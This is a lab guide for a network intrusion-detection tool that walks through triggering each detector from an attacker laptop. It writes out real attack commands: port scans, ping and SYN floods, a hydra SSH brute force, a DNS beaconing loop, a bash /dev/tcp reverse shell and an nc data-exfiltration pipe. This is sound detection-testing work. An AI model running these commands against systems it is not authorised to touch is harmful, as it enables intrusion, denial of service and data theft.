# Real attack demos (two-laptop lab)

How to drive ForenSys with genuine network traffic instead of the in-app simulator, the way you already do for
nmap and ping: one laptop runs ForenSys (the **victim**), a second laptop on the same LAN (the **attacker**) sends
real packets at it. Everything below targets a machine you own, on a network you control.

## 0. Setup

- **Victim laptop:** `npm run dev:privileged` (needs real BPF packet capture — plain `npm run dev` only ever sees
  simulated traffic, so real attacks won't show up). Confirm it's live: `curl -s localhost:8000/api/health` should
  show `"capture_mode":"live"`.
- Note the victim's LAN IP (`ifconfig | grep inet`, usually `192.168.1.x`).
- **Attacker laptop:** any machine with the usual security tools (`nmap`, `hping3`/`nping`, `hydra`, `nc`) —
  install via Homebrew/apt if missing.

## 1. Port scan → `Port Scan`

On the attacker:
```bash
sudo nmap -sS -p 1-1000 -T4 -Pn <victim-ip>
```
Detected within the 15s window once ≥20 ports are probed. Evidence captures every probed port, the scan type
(SYN vs connect) and timing.

## 2. ICMP flood / ping sweep → `ICMP Flood`

```bash
sudo ping -i 0.02 -c 300 <victim-ip>
```
Fires once the echo-request rate passes `icmp_threshold` (50) inside the 10s window.

## 3. TCP SYN flood → `SYN Flood`

```bash
sudo hping3 -S -p 80 -i u2000 -c 400 <victim-ip>
# or: sudo nping --tcp -p 80 --flags syn --rate 300 -c 400 <victim-ip>
```
Many SYNs concentrated on one port is classified as a flood; SYNs spread across many ports is classified as a
port scan instead (so a single `nmap -sS` run never double-reports).

## 4. SSH brute force → `Authentication Attack`

Enable **System Settings → Sharing → Remote Login** on the victim first (or point at any SSH host you own), then
from the attacker:
```bash
hydra -l admin -P /usr/share/wordlists/common-passwords.txt ssh://<victim-ip>
```
With Remote Login on, failed logins are read live from the victim's unified log (`log stream`) and matched by
source IP/port — detection is typically ~1s after the failures land. Without Remote Login, the same connection
storm still trips the network-only heuristic (new connections to port 22 from one IP).

## 5. DNS beaconing → `DNS Beaconing`

Run **on the victim** (simulates an already-compromised host phoning out on a schedule):
```bash
while true; do dig +short update-check.c2-beacon.example.org @8.8.8.8 >/dev/null; sleep 2; done
```
Regular-interval lookups of the same domain sinkhole it after ~5 queries.

## 6. Reverse shell → `Reverse Shell`

Attacker starts a listener:
```bash
nc -lv 4444
```
Victim connects back:
```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```
The outbound shell-to-uncommon-port connection is detected within the 10s window; the attacker IP is blocked and
the shell process is flagged as contained (simulated — the process itself isn't touched, per project policy).

## 7. Data exfiltration → `Data Exfiltration`

Attacker:
```bash
nc -l 9999 > /dev/null
```
Victim:
```bash
dd if=/dev/zero bs=1M count=150 | nc <attacker-ip> 9999
```
~150 MB in one burst clears the 100 MB / 20s threshold. The rule also requires the transfer to be upload-dominant
(≥75% of the bytes exchanged with that peer go out, not come back) - this one-way `nc` push easily qualifies, but
it's also why ordinary downloads/streaming never trigger this rule no matter how large, and why a quiet
threshold bump alone wouldn't have fixed the false positives this used to produce on normal browsing traffic.

## 8. Suspicious listener → `Suspicious Listening Port`

On the victim:
```bash
nc -l 4444
```
A `nc`/`netcat`/`nmap`-named process opening a new listening socket is flagged immediately.

## 9. Suspicious process chain → `Suspicious Process Chain`

On the victim, spawn `nc` from `python3` (stands in for a macro/script launching a shell):
```bash
python3 -c "import subprocess,time; subprocess.Popen(['nc','-l','5555']); time.sleep(60)"
```

## Resetting between runs

Unblock just the attacker's IP from **Playbooks** (or `POST /api/remediation/unblock/<ip>`) so the next run against
that same IP is treated as a fresh attack. To wipe the whole board between demos - alerts, incidents, evidence,
the remediation history, **and every active block** - use **Automation → Reset Lab** (confirmation required).
**Automation → Clear History** only clears the audit-log table itself; it deliberately leaves active containment
(blocked IPs/domains, quarantined processes) untouched, so clearing old log rows can never silently let a blocked
attacker's traffic back through.

## Reminder

All containment above is logical only — see [CLAUDE.md](../CLAUDE.md). Blocking an IP makes the packet sniffer
ignore it; nothing touches your OS firewall, and no process is ever killed or quarantined for real.
